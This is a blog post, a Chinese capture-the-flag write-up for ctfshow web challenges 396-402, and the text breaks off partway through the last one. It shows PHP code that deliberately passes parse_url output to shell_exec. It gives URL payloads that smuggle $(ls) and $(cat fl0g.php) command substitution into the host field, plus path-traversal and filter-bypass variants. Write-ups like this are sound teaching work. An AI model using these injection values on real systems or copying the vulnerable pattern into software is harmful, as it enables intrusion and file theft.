<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="web396 特定函数绕过 题面如下 12345678910111213141516171819202122&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-15 16:38:07# @Last Modified by:   h1xa# @Last Modified time: 2021-01-15 17:20:">
<meta property="og:type" content="article">
<meta property="og:title" content="CTFSHOW-其他">
<meta property="og:url" content="https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/index.html">
<meta property="og:site_name" content="RacerZ">
<meta property="og:description" content="web396 特定函数绕过 题面如下 12345678910111213141516171819202122&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-15 16:38:07# @Last Modified by:   h1xa# @Last Modified time: 2021-01-15 17:20:">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221117233250610.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221117234459926.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221118234831733.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221119002316476.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221119005236988.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221119005536171.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221119100553369.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221119100807040.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221119102046054.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221120003859705.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221121230637067.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221121231457518.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221121232526938.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221121232907990.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221122232807165.png">
<meta property="og:image" content="https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221124234714731.png">
<meta property="article:published_time" content="2022-11-24T16:00:00.000Z">
<meta property="article:modified_time" content="2022-11-24T16:17:38.991Z">
<meta property="article:author" content="RacerZ">
<meta property="article:tag" content="ctfshow">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221117233250610.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>CTFSHOW-其他</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2022/11/25/CC%E4%B8%8Etabby/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/&text=CTFSHOW-其他"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/&title=CTFSHOW-其他"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/&is_video=false&description=CTFSHOW-其他"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CTFSHOW-其他&body=Check out this article: https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/&title=CTFSHOW-其他"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/&title=CTFSHOW-其他"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/&title=CTFSHOW-其他"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/&title=CTFSHOW-其他"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/&name=CTFSHOW-其他&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://racerz-fighting.github.io/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/&t=CTFSHOW-其他"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        CTFSHOW-其他
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">RacerZ</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-11-24T16:00:00.000Z" itemprop="datePublished">2022-11-25</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/ctfshow/" rel="tag">ctfshow</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <ol>
<li><p>web396 特定函数绕过</p>
<p>题面如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 17:20:22</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里通过文档查看<code>parse_url</code>函数可知，host部分是跟在<code>@</code>后头的，而path部分是跟在第一个<code>/</code>后头的（从<code>@</code>开始算的）</p>
<img src="/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221117233250610.png" alt="image-20221117233250610" style="zoom:50%;">

<p>而第二个知识点就是系统命令可以通过反引号或者<code>$()</code>进行包括</p>
<p>因此可以针对host部分和path部分进行构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=http://@$(ls)/var/www/html/1.txt</span><br><span class="line">?url=http://@$(cat fl0g.php)/var/www/html/1.txt</span><br></pre></td></tr></table></figure></li>
<li><p>web397. 特定函数绕过</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 17:49:13</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有个前缀限制，可以通过<code>../</code>绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://@$(cat fl0g.php)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure></li>
<li><p>web398. 特定函数绕过</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 18:00:42</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>禁了<code>;</code>，不过没影响</p>
</li>
<li><p>web399. 特定函数绕过</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 18:04:27</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|&gt;/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ban了<code>; &gt;</code>，可以继续打</p>
</li>
<li><p>web400. 特定函数绕过</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 18:13:14</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|&gt;|http|https/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ban了http和https协议，经测试，只要以<code>//</code>开头仍然可以解析出后面的各键值。那么既然schema字段也没用，直接去掉即可</p>
<p><img src="/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221117234459926.png" alt="image-20221117234459926"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=//@$(cat fl0g.php)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure></li>
<li><p>web401. 特定函数绕过</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 18:16:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|&gt;|http|https|\|/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多ban了一个<code>|</code> 不影响</p>
</li>
<li><p>web402. 特定函数绕过</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 18:35:41</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|&gt;|\||base/i&#x27;</span>, <span class="variable">$url</span>[<span 